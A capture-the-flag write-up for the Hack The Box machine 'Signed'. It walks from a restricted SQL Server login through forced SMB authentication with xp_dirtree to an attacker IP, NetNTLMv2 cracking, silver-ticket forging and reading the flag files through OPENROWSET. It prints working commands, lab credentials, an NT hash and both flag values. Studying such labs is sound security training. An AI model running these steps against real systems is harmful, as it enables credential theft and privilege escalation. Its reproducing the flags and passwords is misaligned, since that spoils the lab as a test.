---
title: 0.4-Signed
date: '2026-09-25'
category: ctf
description: ''
tags:
  - htb
draft: false
---

# Signed: From a SQL Login to a Service Ticket and Both Flags

Signed exposed one useful service: Microsoft SQL Server on `10.10.11.90:1433`. The starting credential gave me a restricted SQL session. A forced SMB connection then exposed the SQL service account’s challenge response, and a ticket forged for the MSSQL service changed what that session could read.

## A restricted starting point

The scan identified SQL Server 2022 on `dc01.signed.htb` in the `SIGNED.HTB` domain. I added `10.10.11.90 signed.htb dc01.signed.htb` to my hosts file and used the provided `scott:Sm230#C5NatH` credential to connect:

~~~bash
impacket-mssqlclient 'signed.htb/scott:Sm230#C5NatH@dc01.signed.htb'
~~~

The prompt showed `scott guest@master`. Attempting `enable_xp_cmdshell` failed with permission and `RECONFIGURE` errors. Rather than relying on operating-system commands, I tried an extended stored procedure that made SQL Server access a network path:

~~~sql
EXEC xp_dirtree '\\10.10.15.71\test';
~~~

The server connected back to my SMB listener. Capturing that authentication with Responder produced a NetNTLMv2 challenge response for `mssqlsvc`. I then tested the captured hash against `rockyou.txt`:

~~~bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
~~~

The recovered password was `purPLE9795!@`. The full captured challenge-response string was not preserved in the notes, so I use `hash.txt` here as the local file containing that capture.

## The service account and its SQL identity

I authenticated with Windows authentication as `mssqlsvc`. Because the password itself ends in `@`, the target string contains another `@` as the account/host separator:

~~~bash
impacket-mssqlclient 'signed.htb/mssqlsvc:purPLE9795!@@dc01.signed.htb' -windows-auth
~~~

This time the prompt identified `SIGNED\mssqlsvc guest@master`. A query of `sys.server_principals` showed a `SIGNED\IT` Windows group, which led me to the group-related authorization path:

~~~sql
SELECT name, type_desc, is_disabled
FROM sys.server_principals
WHERE type IN ('S', 'U', 'G')
  AND name NOT LIKE '##%';
~~~

The service account password yielded the NT hash `EF699384C3285C54128A3EE1DDB1A0CC`. With that key, the `SIGNED.HTB` domain SID `S-1-5-21-4088429403-1159899800-2753317549`, and the SQL service principal, I constructed a service ticket whose authorization data carried the group RIDs used in this lab:

~~~bash
ticketer.py -nthash EF699384C3285C54128A3EE1DDB1A0CC \
  -domain-sid S-1-5-21-4088429403-1159899800-2753317549 \
  -domain SIGNED.HTB \
  -spn MSSQLSvc/DC01.SIGNED.HTB \
  -groups 512,519,1105 \
  -user-id 1103 mssqlsvc

KRB5CCNAME=mssqlsvc.ccache impacket-mssqlclient -k dc01.signed.htb
~~~

RIDs `512` and `519` refer to well-known administrative domain groups; `1105` and the user RID `1103` came from this domain. This is a silver ticket for the MSSQL service, signed with that service account’s key. It is service-scoped; it does not require the domain’s `krbtgt` key. On reconnecting, the prompt changed to `SIGNED\mssqlsvc dbo@master`, showing that the forged ticket produced a materially different SQL authorization context.

## Reading the flags through SQL Server

I used `OPENROWSET(BULK ...)` to load two local files through SQL Server:

~~~sql
SELECT * FROM OPENROWSET(
  BULK 'C:\Users\mssqlsvc\Desktop\user.txt',
  SINGLE_CLOB
) AS contents;

SELECT * FROM OPENROWSET(
  BULK 'C:\Users\Administrator\Desktop\root.txt',
  SINGLE_CLOB
) AS contents;
~~~

The first query returned `2a3931cd7cba00ddd9a2b353bf65c0ae`. The second returned `488d356fdc7ec55b267e30815045b64e`. The prompt was in `master` for both queries. The successful reads prove that the effective SQL session could access those files; they do not by themselves establish whether the Windows file read used an impersonated login or the SQL Server process account. SQL Server’s bulk-file access rules depend on the authentication context.

This route illustrates why a SQL login that appears limited can still matter. `xp_dirtree` provided a network authentication primitive, the captured response disclosed a crackable service-account password, and the service account’s key let a forged MSSQL ticket change group authorization. I obtained both flags through SQL queries; an interactive Windows shell was not part of the demonstrated path.

Further reading: [Microsoft’s bulk-file access and authentication rules](https://learn.microsoft.com/en-us/sql/relational-databases/import-export/import-bulk-data-by-using-bulk-insert-or-openrowset-bulk-sql-server).
